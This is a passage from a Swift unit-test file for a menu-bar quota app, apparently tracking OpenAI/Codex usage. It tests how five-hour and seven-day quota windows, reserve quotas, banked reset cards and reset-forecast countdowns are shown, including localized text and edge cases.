            windows: [fiveHour, sevenDay],
            lunaReserve: LunaReserveQuota(status: .available, remaining: 45, reset: "1h30m"),
            bankedReset: bankedReset
        )
        let presented = official.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: false
        )
        XCTAssertEqual(presented.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertNil(presented.lunaReserve)
        XCTAssertNil(presented.lunaReserveInsertionIndex)
        XCTAssertEqual(presented.bankedReset?.availableCount, 2)
        XCTAssertEqual(presented.bankedReset?.cards.map(\.id), ["earlier", "undated"])
        XCTAssertEqual(presented.resetForecast, .unavailable)

        let scored = Snapshot.official(
            "OpenAI",
            45,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: [fiveHour, sevenDay],
            bankedReset: bankedReset,
            resetForecast: .demo(updatedAt: date)
        )
        XCTAssertEqual(
            scored.officialQuotaMenuPresentation(
                lunaReserveDisplayMode: .always,
                hideExhaustedQuota: false
            ).resetForecast,
            .demo(updatedAt: date)
        )

        let emptyOfficial = Snapshot.official(
            "OpenAI",
            45,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: [fiveHour, sevenDay]
        )
        XCTAssertNil(
            emptyOfficial.officialQuotaMenuPresentation(
                lunaReserveDisplayMode: .always,
                hideExhaustedQuota: false
            ).bankedReset
        )

        let zeroCountOfficial = Snapshot.official(
            "OpenAI",
            45,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: [fiveHour, sevenDay],
            bankedReset: CodexBankedReset(cards: []),
            resetForecast: CodexResetForecast(
                probability24h: .percent(12),
                probability48h: .unavailable,
                confidence: .unknown("experimental"),
                updatedAt: date,
                isCached: false
            )
        )
        let zeroCountPresented = zeroCountOfficial.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: false
        )
        XCTAssertEqual(zeroCountPresented.bankedReset?.availableCount, 0)
        XCTAssertEqual(zeroCountPresented.bankedReset?.cards, [])
        XCTAssertEqual(zeroCountPresented.resetForecast.probability24h, .percent(12))
        XCTAssertEqual(zeroCountPresented.resetForecast.confidence, .unknown("experimental"))
        XCTAssertEqual(
            zeroCountPresented.resetForecast.confidence.displayText(language: .simplifiedChinese),
            "未知"
        )
        XCTAssertNil(zeroCountPresented.resetForecast.officialSignal)
        XCTAssertEqual(
            zeroCountPresented.resetForecast.menuProbabilityPresentation,
            .ordinary(.percent(12))
        )
        XCTAssertTrue(zeroCountPresented.resetForecast.showsOrdinaryForecastMetrics)

        let strongSignalForecast = CodexResetForecast(
            probability24h: .percent(20),
            probability48h: .percent(35),
            confidence: .low,
            updatedAt: date,
            isCached: false,
            officialSignal: CodexResetOfficialSignal(probability: .percent(71))
        )
        XCTAssertEqual(
            strongSignalForecast.menuProbabilityPresentation,
            .strongSignal(.percent(71))
        )
        XCTAssertFalse(strongSignalForecast.showsOrdinaryForecastMetrics)
        XCTAssertEqual(strongSignalForecast.menuPrimaryDisplayText(language: .english), "71%")

        let fallbackForecast = CodexResetForecast(
            probability24h: .percent(20),
            probability48h: .percent(35),
            confidence: .low,
            updatedAt: date,
            isCached: false,
            officialSignal: .probabilityUnavailable
        )
        XCTAssertEqual(
            fallbackForecast.menuProbabilityPresentation,
            .strongSignal(.unavailable)
        )
        XCTAssertFalse(fallbackForecast.showsOrdinaryForecastMetrics)
        XCTAssertEqual(
            fallbackForecast.menuPrimaryDisplayText(language: .simplifiedChinese),
            "高概率"
        )
        XCTAssertEqual(
            fallbackForecast.menuPrimaryDisplayText(language: .english),
            "High Prob."
        )
        XCTAssertNotEqual(fallbackForecast.menuPrimaryDisplayText(), "20%")
        XCTAssertNotEqual(fallbackForecast.menuPrimaryDisplayText(), "83%")
        XCTAssertEqual(
            fallbackForecast.officialHintText(language: .simplifiedChinese),
            "官方重置提示 · 暂无具体时间点"
        )
        XCTAssertNil(fallbackForecast.remainingCountdownSeconds(now: date))

        XCTAssertEqual(
            CodexResetOfficialCountdownFormatting.displayText(seconds: 14_363),
            "3h59m"
        )
        XCTAssertEqual(
            CodexResetOfficialCountdownFormatting.displayText(seconds: 5_025),
            "1h23m"
        )
        XCTAssertEqual(
            CodexResetOfficialCountdownFormatting.displayText(seconds: 723),
            "12m"
        )
        XCTAssertEqual(
            CodexResetOfficialCountdownFormatting.displayText(seconds: 45),
            "0m"
        )
        XCTAssertEqual(
            CodexResetOfficialCountdownFormatting.displayText(seconds: 0),
            "0m"
        )
        XCTAssertEqual(
            CodexResetOfficialCountdownFormatting.displayText(seconds: -8),
            "0m"
        )
        XCTAssertEqual(
            CodexResetOfficialCountdownFormatting.displayText(minutes: 239),
            "3h59m"
        )
        XCTAssertEqual(
            CodexResetOfficialCountdownFormatting.displayText(minutes: 0),
            "0m"
        )

        let countdownForecast = CodexResetForecast(
            probability24h: .percent(20),
            probability48h: .percent(35),
            confidence: .low,
            updatedAt: date,
            isCached: false,
            officialSignal: CodexResetOfficialSignal(
                probability: .percent(71),
                targetAt: date.addingTimeInterval(3_665)
            )
        )
        XCTAssertEqual(countdownForecast.remainingCountdownSeconds(now: date), 3_665)
        XCTAssertEqual(countdownForecast.remainingCountdownMinutes(now: date), 61)
        XCTAssertEqual(countdownForecast.menuPrimaryDisplayText(now: date), "1h1m")
        XCTAssertEqual(
            countdownForecast.officialHintText(language: .simplifiedChinese),
            "官方重置提示 · 具体时间点"
        )
        XCTAssertEqual(
            countdownForecast.officialHintText(language: .english),
            "Official reset hint · Specific time"
        )
        XCTAssertFalse(
            countdownForecast.officialHintText(language: .simplifiedChinese)?.contains("10/5") == true
        )
        XCTAssertEqual(
            countdownForecast.remainingCountdownSeconds(now: date.addingTimeInterval(3_665)),
            0
        )
        XCTAssertEqual(
            countdownForecast.menuPrimaryDisplayText(now: date.addingTimeInterval(4_000)),
            "0m"
        )
        XCTAssertEqual(
            countdownForecast.officialHintText(language: .simplifiedChinese),
            "官方重置提示 · 具体时间点"
        )
        XCTAssertNil(countdownForecast.officialCountdownProgressSpan())

        let published = date.addingTimeInterval(-3_600)
        let resetAt = date.addingTimeInterval(3_600)
        let progressForecast = CodexResetForecast(
            probability24h: .percent(20),
            probability48h: .percent(35),
            confidence: .low,
            updatedAt: date,
            isCached: false,
            officialSignal: CodexResetOfficialSignal(
                probability: .percent(71),
                targetAt: resetAt,
                publishedAt: published
            )
        )
        XCTAssertNil(progressForecast.officialHintText())
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownElapsedFraction(now: published)),
            0,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownRemainingFraction(now: published)),
            1,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownElapsedFraction(now: date)),
            0.5,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownRemainingFraction(now: date)),
            0.5,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownElapsedFraction(now: resetAt)),
            1,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownRemainingFraction(now: resetAt)),
            0,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownElapsedFraction(now: resetAt.addingTimeInterval(30))),
            1,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownRemainingFraction(now: resetAt.addingTimeInterval(30))),
            0,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownElapsedFraction(now: published.addingTimeInterval(-30))),
            0,
            accuracy: 0.0001
        )
        XCTAssertEqual(
            try XCTUnwrap(progressForecast.officialCountdownRemainingFraction(now: published.addingTimeInterval(-30))),
            1,
            accuracy: 0.0001
        )
        let inverted = CodexResetForecast(
            probability24h: .percent(20),
            probability48h: .percent(35),
            confidence: .low,
            updatedAt: date,
            isCached: false,
            officialSignal: CodexResetOfficialSignal(
                probability: .percent(71),
                targetAt: published,
                publishedAt: resetAt
            )
        )
        XCTAssertNil(inverted.officialCountdownElapsedFraction(now: date))
        XCTAssertNil(inverted.officialCountdownRemainingFraction(now: date))
        XCTAssertEqual(
            inverted.officialHintText(language: .simplifiedChinese),
            "官方重置提示 · 具体时间点"
        )
        XCTAssertNil(zeroCountPresented.resetForecast.officialHintText())

        let balance = Snapshot.balance(
            "Custom",
            12.5,
            "USD",
            nil,
            date
        )
        XCTAssertNil(
            balance.officialQuotaMenuPresentation(
                lunaReserveDisplayMode: .always,
                hideExhaustedQuota: false
            ).bankedReset
        )
    }

    func testCodexResetObservationRequiresConsumptionAndASevenDayCycleJump() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        func sample(fiveHour: Double, sevenDay: Double, resetAt: TimeInterval) -> CodexResetQuotaSample {
            CodexResetQuotaSample(
                fiveHourRemaining: fiveHour,
                sevenDayRemaining: sevenDay,
                sevenDayResetAt: now.addingTimeInterval(resetAt)
            )
        }

        var untouched = CodexResetObservation()
        untouched.observe(sample(fiveHour: 100, sevenDay: 100, resetAt: 6 * 86_400), now: now)
        untouched.observe(sample(fiveHour: 100, sevenDay: 100, resetAt: 7 * 86_400), now: now)
        XCTAssertEqual(untouched.state, .notEligible)

        var watching = CodexResetObservation()
        watching.observe(sample(fiveHour: 85, sevenDay: 92, resetAt: 6 * 86_400), now: now)
        XCTAssertEqual(watching.state, .watching)
        watching.observe(sample(fiveHour: 100, sevenDay: 100, resetAt: 6 * 86_400 + 60), now: now)
        XCTAssertEqual(watching.state, .watching)
        watching.observe(sample(fiveHour: 100, sevenDay: 100, resetAt: 13 * 86_400), now: now)
        XCTAssertEqual(watching.state, .observed)
        XCTAssertEqual(watching.detectedAt, now)

        var singleWindow = CodexResetObservation()
        singleWindow.observe(sample(fiveHour: 85, sevenDay: 92, resetAt: 6 * 86_400), now: now)
        singleWindow.observe(sample(fiveHour: 100, sevenDay: 92, resetAt: 13 * 86_400), now: now)
        XCTAssertEqual(singleWindow.state, .watching)
    }

    func testCodexResetConfirmedForecastSuppressesSignalCountdownAndForecastMetrics() {
        let signal = CodexResetOfficialSignal(
            probability: .percent(93),
            targetAt: Date(timeIntervalSince1970: 1_700_003_600),
            episodeKey: "tweet:123"
        )
        let forecast = CodexResetForecast(
            probability24h: .percent(20),
            probability48h: .percent(35),
            confidence: .high,
            updatedAt: Date(timeIntervalSince1970: 1_700_000_000),
            isCached: false,
            officialSignal: signal,
            officialResetObservation: .observed
        )
        XCTAssertTrue(forecast.isOfficialResetConfirmed)
        XCTAssertNil(forecast.remainingCountdownSeconds(now: Date(timeIntervalSince1970: 1_700_000_000)))
        XCTAssertEqual(forecast.menuPrimaryDisplayText(language: .simplifiedChinese), "✅ 已重置")
        XCTAssertEqual(
            forecast.officialHintText(language: .simplifiedChinese),
            "本轮已完成"
        )
    }

    func testCodexResetObservationStoreRestoresOnlyTheMatchingAccountAndEpisode() throws {
        let suiteName = "BalanceBarTests.codex-reset-observation-\(UUID().uuidString)"
        let defaults = try XCTUnwrap(UserDefaults(suiteName: suiteName))
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let store = CodexResetObservationStore(defaults: defaults)
        var observation = CodexResetObservation()
        observation.observe(
            CodexResetQuotaSample(
                fiveHourRemaining: 80,
                sevenDayRemaining: 90,
                sevenDayResetAt: Date(timeIntervalSince1970: 1_700_000_000)
            ),
            now: Date(timeIntervalSince1970: 1_700_000_000)
        )
        store.save(
            providerID: "official",
            accountKey: "person@example.com",
            episodeKey: "tweet:1",
            observation: observation
        )

        let restored = try XCTUnwrap(
            store.load(providerID: "official", accountKey: "person@example.com")
        )
        XCTAssertEqual(restored.episodeKey, "tweet:1")
        XCTAssertEqual(restored.observation, observation)
        XCTAssertNil(store.load(providerID: "official", accountKey: "other@example.com"))
        XCTAssertNil(store.load(providerID: "other-provider", accountKey: "person@example.com"))
    }

    func testBankedResetRemainingUsesWarningThresholdUnderTwentyFourHours() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let sixHours = try XCTUnwrap(
            CodexBankedResetFormatting.remaining(
                until: now.addingTimeInterval(6 * 3_600),
                now: now
            )
        )
        XCTAssertEqual(
            sixHours.text,
            tr(.keyCodexBankedResetRemainingHours, arguments: ["6"])
        )
        XCTAssertFalse(sixHours.text.contains("剩余"))
        XCTAssertFalse(sixHours.text.contains("剩餘"))
        XCTAssertFalse(sixHours.text.contains("Remaining"))
        XCTAssertTrue(sixHours.isWarning)

        let oneDayFourHours = try XCTUnwrap(
            CodexBankedResetFormatting.remaining(
                until: now.addingTimeInterval((1 * 86_400) + (4 * 3_600)),
                now: now
            )
        )
        XCTAssertEqual(
            oneDayFourHours.text,
            tr(.keyCodexBankedResetRemainingDaysHours, arguments: ["1", "4"])
        )
        XCTAssertFalse(oneDayFourHours.isWarning)

        let exactlyOneDay = try XCTUnwrap(
            CodexBankedResetFormatting.remaining(
                until: now.addingTimeInterval(86_400),
                now: now
            )
        )
        XCTAssertEqual(
            exactlyOneDay.text,
            tr(.keyCodexBankedResetRemainingDays, arguments: ["1"])
        )
        XCTAssertFalse(exactlyOneDay.isWarning)

        let expiry = try XCTUnwrap(
            OfficialQuotaResetFormatter.bankedResetString(
                for: now.addingTimeInterval(86_400),
                relativeTo: now
            )
        )
        XCTAssertFalse(expiry.contains("GMT"))

        let soon = CodexBankedResetCard(
            id: "soon",
            resetType: "codex_rate_limits",
            titleText: "Reset",
            expiresAt: now.addingTimeInterval(3_600),
            expiresText: "ticket"
        )
        let later = CodexBankedResetCard(
            id: "later",
            resetType: "codex_rate_limits",
            titleText: "Reset",
            expiresAt: now.addingTimeInterval(86_400),
            expiresText: "later ticket"
        )
        let past = CodexBankedResetCard(
            id: "past",
            resetType: "codex_rate_limits",
            titleText: "Reset",
            expiresAt: now.addingTimeInterval(-60),
            expiresText: nil
        )
        let undated = CodexBankedResetCard(
            id: "undated",
            resetType: "codex_rate_limits",
            titleText: "Reset",
            expiresAt: nil,
            expiresText: nil
        )
        let stamp = try XCTUnwrap(
            OfficialQuotaResetFormatter.bankedResetString(
                for: soon.expiresAt,
                relativeTo: now
            )
        )
        XCTAssertEqual(
            CodexBankedResetFormatting.nearestExpiryText(
                cards: [later, undated, past, soon],
                relativeTo: now
            ),
            tr(.keyCodexBankedResetNearestExpiry, arguments: [stamp])
        )
        XCTAssertNil(
            CodexBankedResetFormatting.nearestExpiryText(
                cards: [past, undated],
                relativeTo: now
            )
        )
        XCTAssertNotEqual(
            CodexBankedResetFormatting.nearestExpiryText(cards: [soon], relativeTo: now),
            CodexBankedResetFormatting.expiryText(for: soon.expiresAt, relativeTo: now)
        )
    }

    func testOfficialQuotaMenuPresentationSupportsLunaReserveDisplayModesAndExhaustedHiding() {
        LunaReserveUserFacing.testOverride = true
        defer { LunaReserveUserFacing.testOverride = nil }
        let date = Date(timeIntervalSince1970: 1_700_000_000)
        let reserve = LunaReserveQuota(status: .available, remaining: 45, reset: "1h30m")

        func snapshot(
            fiveHourRemaining: Double,
            sevenDayRemaining: Double,
            lunaReserve: LunaReserveQuota?
        ) -> Snapshot {
            let fiveHour = OfficialQuotaWindow(
                kind: .fiveHour,
                remaining: fiveHourRemaining,
                label: "5-hour",
                daysText: "5 hours",
                reset: "1h",
                durationSeconds: 18_000
            )
            let sevenDay = OfficialQuotaWindow(
                kind: .sevenDay,
                remaining: sevenDayRemaining,
                label: "7-day",
                daysText: "7 days",
                reset: "6d",
                durationSeconds: 604_800
            )
            return Snapshot.official(
                "OpenAI",
                sevenDayRemaining,
                sevenDay.label,
                sevenDay.reset,
                date,
                windows: [fiveHour, sevenDay],
                lunaReserve: lunaReserve
            )
        }

        let plusSnapshot = snapshot(
            fiveHourRemaining: 0,
            sevenDayRemaining: 60,
            lunaReserve: reserve
        )

        let disabled = plusSnapshot.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .disabled,
            hideExhaustedQuota: true
        )
        XCTAssertEqual(disabled.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertNil(disabled.lunaReserve)
        XCTAssertNil(disabled.lunaReserveInsertionIndex)

        let threshold = plusSnapshot.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .whenQuotaExhausted,
            hideExhaustedQuota: false
        )
        XCTAssertEqual(threshold.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(threshold.lunaReserve, reserve)
        XCTAssertEqual(threshold.lunaReserveInsertionIndex, 1)

        let thresholdHiding = plusSnapshot.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .whenQuotaExhausted,
            hideExhaustedQuota: true
        )
        XCTAssertEqual(thresholdHiding.windows.map(\.kind), [.sevenDay])
        XCTAssertEqual(thresholdHiding.lunaReserve, reserve)
        XCTAssertEqual(thresholdHiding.lunaReserveInsertionIndex, 0)

        let alwaysFiveHourExhausted = plusSnapshot.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: false
        )
        XCTAssertEqual(alwaysFiveHourExhausted.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(alwaysFiveHourExhausted.lunaReserveInsertionIndex, 1)

        let alwaysFiveHourHidden = plusSnapshot.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: true
        )
        XCTAssertEqual(alwaysFiveHourHidden.windows.map(\.kind), [.sevenDay])
        XCTAssertEqual(alwaysFiveHourHidden.lunaReserve, reserve)
        XCTAssertEqual(alwaysFiveHourHidden.lunaReserveInsertionIndex, 0)

        let sevenDayExhausted = snapshot(
            fiveHourRemaining: 60,
            sevenDayRemaining: 0,
            lunaReserve: reserve
        )
        let alwaysSevenDayExhausted = sevenDayExhausted.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: false
        )
        XCTAssertEqual(alwaysSevenDayExhausted.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(alwaysSevenDayExhausted.lunaReserveInsertionIndex, 2)

        let alwaysSevenDayHidden = sevenDayExhausted.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: true
        )
        XCTAssertEqual(alwaysSevenDayHidden.windows.map(\.kind), [.fiveHour])
        XCTAssertEqual(alwaysSevenDayHidden.lunaReserveInsertionIndex, 1)

        let proSevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 0,
            label: "7-day",
            daysText: "7 days",
            reset: "6d",
            durationSeconds: 604_800
        )
        let proSnapshot = Snapshot.official(
            "OpenAI",
            0,
            proSevenDay.label,
            proSevenDay.reset,
            date,
            windows: [proSevenDay],
            lunaReserve: reserve
        )
        let pro = proSnapshot.officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .whenQuotaExhausted,
            hideExhaustedQuota: true
        )
        XCTAssertTrue(pro.windows.isEmpty)
        XCTAssertEqual(pro.lunaReserve, reserve)
        XCTAssertEqual(pro.lunaReserveInsertionIndex, 0)

        let bothExhausted = snapshot(
            fiveHourRemaining: 0,
            sevenDayRemaining: 0,
            lunaReserve: reserve
        ).officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .whenQuotaExhausted,
            hideExhaustedQuota: true
        )
        XCTAssertTrue(bothExhausted.windows.isEmpty)
        XCTAssertEqual(bothExhausted.lunaReserve, reserve)
        XCTAssertEqual(bothExhausted.lunaReserveInsertionIndex, 0)

        let bothAlways = snapshot(
            fiveHourRemaining: 0,
            sevenDayRemaining: 0,
            lunaReserve: reserve
        ).officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: false
        )
        XCTAssertEqual(bothAlways.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(bothAlways.lunaReserveInsertionIndex, 1)

        let bothAlwaysHidden = snapshot(
            fiveHourRemaining: 0,
            sevenDayRemaining: 0,
            lunaReserve: reserve
        ).officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: true
        )
        XCTAssertTrue(bothAlwaysHidden.windows.isEmpty)
        XCTAssertEqual(bothAlwaysHidden.lunaReserveInsertionIndex, 0)

        let neitherExhausted = snapshot(
            fiveHourRemaining: 60,
            sevenDayRemaining: 60,
            lunaReserve: reserve
        ).officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: true
        )
        XCTAssertEqual(neitherExhausted.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(neitherExhausted.lunaReserveInsertionIndex, 1)

        let unavailableReserve = LunaReserveQuota(status: .unavailable, remaining: nil, reset: nil)
        let unavailable = snapshot(
            fiveHourRemaining: 0,
            sevenDayRemaining: 60,
            lunaReserve: unavailableReserve
        ).officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: true
        )
        XCTAssertEqual(unavailable.windows.map(\.kind), [.sevenDay])
        XCTAssertEqual(unavailable.lunaReserve, unavailableReserve)
        XCTAssertEqual(unavailable.lunaReserveInsertionIndex, 0)

        let withoutReserve = snapshot(
            fiveHourRemaining: 0,
            sevenDayRemaining: 60,
            lunaReserve: nil
        ).officialQuotaMenuPresentation(
            lunaReserveDisplayMode: .always,
            hideExhaustedQuota: true
        )
        XCTAssertEqual(withoutReserve.windows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertNil(withoutReserve.lunaReserve)
        XCTAssertNil(withoutReserve.lunaReserveInsertionIndex)
    }

    func testLunaReserveDemoModesKeepZeroAvailableAndUnavailableDistinct() {
        let previousLanguage = AppLanguage.selected
        defer { AppLanguage.selected = previousLanguage }
        AppLanguage.selected = .english

        let zero = DevelopmentLunaReserveDemo.snapshot(
            mode: .zero,
            providerName: "OpenAI",
            date: Date(timeIntervalSince1970: 1_700_000_000)
        )
        XCTAssertEqual(zero.lunaReserve?.status, .available)
        XCTAssertEqual(zero.lunaReserve?.remaining, 0)
        XCTAssertEqual(zero.lunaReserve?.menuTitleText, "🌙 Luna Reserve")
        XCTAssertEqual(zero.lunaReserve?.menuSubtitleText, "1h30m")

        let fiveHourExhausted = DevelopmentLunaReserveDemo.snapshot(
            mode: .fiveHourExhausted,
            providerName: "OpenAI",
            date: Date(timeIntervalSince1970: 1_700_000_000)
        )
        XCTAssertEqual(fiveHourExhausted.officialQuotaWindows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(fiveHourExhausted.officialQuotaWindows.first?.remaining, 0)
        XCTAssertEqual(fiveHourExhausted.officialQuotaWindows.last?.remaining, 60)
        XCTAssertEqual(fiveHourExhausted.lunaReserve?.status, .available)
        XCTAssertEqual(fiveHourExhausted.lunaReserve?.remaining, 45)

        let sevenDayExhausted = DevelopmentLunaReserveDemo.snapshot(
            mode: .sevenDayExhausted,
            providerName: "OpenAI",
            date: Date(timeIntervalSince1970: 1_700_000_000)
        )
        XCTAssertEqual(sevenDayExhausted.officialQuotaWindows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(sevenDayExhausted.officialQuotaWindows.first?.remaining, 75)
        XCTAssertEqual(sevenDayExhausted.officialQuotaWindows.last?.remaining, 0)
        XCTAssertEqual(sevenDayExhausted.lunaReserve?.status, .available)
        XCTAssertEqual(sevenDayExhausted.lunaReserve?.remaining, 45)

        let bothExhausted = DevelopmentLunaReserveDemo.snapshot(
            mode: .bothExhausted,
            providerName: "OpenAI",
            date: Date(timeIntervalSince1970: 1_700_000_000)
        )
        XCTAssertEqual(bothExhausted.officialQuotaWindows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(bothExhausted.officialQuotaWindows.first?.remaining, 0)
        XCTAssertEqual(bothExhausted.officialQuotaWindows.last?.remaining, 0)
        XCTAssertEqual(bothExhausted.lunaReserve?.status, .available)
        XCTAssertEqual(bothExhausted.lunaReserve?.remaining, 45)

        let unavailable = DevelopmentLunaReserveDemo.snapshot(
            mode: .unavailable,
            providerName: "OpenAI",
            date: Date(timeIntervalSince1970: 1_700_000_000)
        )
        XCTAssertEqual(unavailable.lunaReserve?.status, .unavailable)
        XCTAssertNil(unavailable.lunaReserve?.remaining)
        XCTAssertEqual(unavailable.lunaReserve?.menuTitleText, "🌙 Luna Reserve")
        XCTAssertEqual(
            unavailable.lunaReserve?.menuSubtitleText,
            "Luna Reserve temporarily unavailable"
        )
    }

    func testBankedResetDemoTenCardsKeepsCountProbabilityAndWarningExpiry() throws {
        let previousLanguage = AppLanguage.selected
        defer { AppLanguage.selected = previousLanguage }
        AppLanguage.selected = .simplifiedChinese

        let date = Date(timeIntervalSince1970: 1_700_000_000)
        let snapshot = DevelopmentBankedResetDemo.snapshot(
            mode: .tenCards,
            providerName: "OpenAI",
            date: date
        )
        let bankedReset = try XCTUnwrap(snapshot.bankedReset)
        XCTAssertEqual(bankedReset.availableCount, DevelopmentBankedResetDemo.cardCount)
        XCTAssertEqual(bankedReset.cards.count, 10)
        XCTAssertEqual(snapshot.resetForecast, .demo(updatedAt: date))
        XCTAssertNil(snapshot.lunaReserve)
        XCTAssertEqual(snapshot.officialQuotaWindows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertTrue(bankedReset.cards[0].remainingIsWarning)
        XCTAssertFalse(bankedReset.cards[9].remainingIsWarning)
        XCTAssertEqual(
            bankedReset.cards.map(\.resetType),
            Array(repeating: "codex_rate_limits", count: 10)
        )
        XCTAssertEqual(
            Set(bankedReset.cards.compactMap(\.id)).count,
            10
        )
    }

    func testBankedResetDemoZeroCardsKeepsWindowsAndEmptyCount() throws {
        let date = Date(timeIntervalSince1970: 1_700_000_000)
        let snapshot = DevelopmentBankedResetDemo.snapshot(
            mode: .zeroCards,
            providerName: "OpenAI",
            date: date
        )
        let bankedReset = try XCTUnwrap(snapshot.bankedReset)
        XCTAssertEqual(bankedReset.availableCount, 0)
        XCTAssertTrue(bankedReset.cards.isEmpty)
        XCTAssertEqual(snapshot.officialQuotaWindows.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(snapshot.officialQuotaWindows.first?.remaining, 80)
        XCTAssertEqual(snapshot.officialQuotaWindows.last?.remaining, 45)
        XCTAssertEqual(snapshot.resetForecast, .demo(updatedAt: date))
        XCTAssertNil(snapshot.lunaReserve)
    }

    func testMenuBarQuotaWindowSelectionUsesRealWindowsAndSafeMissingFallbacks() {
        let date = Date(timeIntervalSince1970: 1_700_000_000)
        let exactCalendar = Calendar(identifier: .gregorian)
        let exactLocale = Locale(identifier: "en_GB")
        let exactTimeZone = TimeZone(secondsFromGMT: 0)!
        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-hour",
            daysText: "5 hours",
            reset: "same",
            durationSeconds: 18_000,
            resetAt: date.addingTimeInterval(3_600)
        )
        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-day",
            daysText: "7 days",
            reset: "same",
            durationSeconds: 604_800,
            resetAt: date.addingTimeInterval(7_200)
        )
        let windows = [fiveHour, sevenDay]
        let snapshot = Snapshot.official(
            "OpenAI",
            sevenDay.remaining,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: windows
        )

        let fiveHourPresentation = snapshot.menuBarSnapshot(preferredQuotaWindow: .fiveHour)
        XCTAssertEqual(fiveHourPresentation.amount, fiveHour.remaining)
        XCTAssertEqual(fiveHourPresentation.unit, fiveHour.label)
        XCTAssertEqual(fiveHourPresentation.message, fiveHour.reset)
        XCTAssertEqual(fiveHourPresentation.officialQuotaWindows, snapshot.officialQuotaWindows)
        XCTAssertEqual(
            fiveHourPresentation.officialResetDisplayValue(
                now: date,
                calendar: exactCalendar,
                locale: exactLocale,
                timeZone: exactTimeZone
            ),
            fiveHour.resetDisplayText(
                now: date,
                calendar: exactCalendar,
                locale: exactLocale,
                timeZone: exactTimeZone
            )
        )

        let sevenDayPresentation = snapshot.menuBarSnapshot(preferredQuotaWindow: .sevenDay)
        XCTAssertEqual(sevenDayPresentation.amount, sevenDay.remaining)
        XCTAssertEqual(sevenDayPresentation.unit, sevenDay.label)
        XCTAssertEqual(sevenDayPresentation.message, sevenDay.reset)
        XCTAssertEqual(
            sevenDayPresentation.officialResetDisplayValue(
                now: date,
                calendar: exactCalendar,
                locale: exactLocale,
                timeZone: exactTimeZone
            ),
            sevenDay.resetDisplayText(
                now: date,
                calendar: exactCalendar,
                locale: exactLocale,
                timeZone: exactTimeZone
            )
        )

        let onlySevenDay = Snapshot.official(
            "OpenAI",
            sevenDay.remaining,
            sevenDay.label,
            sevenDay.reset,
            date,
            windows: [sevenDay]
        )
        let fiveHourFallback = onlySevenDay.menuBarSnapshot(preferredQuotaWindow: .fiveHour)
        XCTAssertEqual(fiveHourFallback.amount, sevenDay.remaining)
        XCTAssertEqual(fiveHourFallback.unit, sevenDay.label)

        let onlyFiveHour = Snapshot.official(
            "OpenAI",
            fiveHour.remaining,
            fiveHour.label,
            fiveHour.reset,
            date,
            windows: [fiveHour]
        )
        let missingSevenDay = onlyFiveHour.menuBarSnapshot(preferredQuotaWindow: .sevenDay)
        XCTAssertEqual(missingSevenDay.kind, .error)
        XCTAssertEqual(missingSevenDay.menuBarPrimary, "!")
        XCTAssertNil(missingSevenDay.amount)
        XCTAssertNil(missingSevenDay.unit)

        let legacy = Snapshot.official(
            "OpenAI",
            63,
            "Quota",
            "later",
            date,
            windows: [OfficialQuotaWindow(
                kind: .other,
                remaining: 63,
                label: "Quota",
                daysText: "Quota",
                reset: "later",
                durationSeconds: nil
            )]
        )
        let legacyPresentation = legacy.menuBarSnapshot(preferredQuotaWindow: .fiveHour)
        XCTAssertEqual(legacyPresentation.amount, 63)
